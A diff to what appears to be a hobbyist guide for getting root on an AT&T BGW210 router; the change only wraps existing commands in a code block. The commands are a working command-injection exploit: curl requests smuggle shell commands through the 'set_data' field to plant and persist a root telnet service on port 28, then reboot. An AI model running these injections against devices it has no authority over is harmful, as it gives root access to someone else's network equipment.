@@ -36,6 +36,7 @@ Once you authenticate, run these CURL commands (remember to navigate to cURL, se
 
 (tech has no password when prompted)
 
+  ```
 curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
  
 curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -a /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
@@ -43,6 +44,7 @@ curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&s
 curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -s|" -v --http1.1 https://192.168.1.254:49955/caserver
  
 curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| reboot|" -v --http1.1 https://192.168.1.254:49955/caserver
+  ```
  
 The AT&T RG (BGW210) will reboot after the final command, and you'll be able to telnet on port 28 as admin w/ device access code as the password once it reboots. 
 
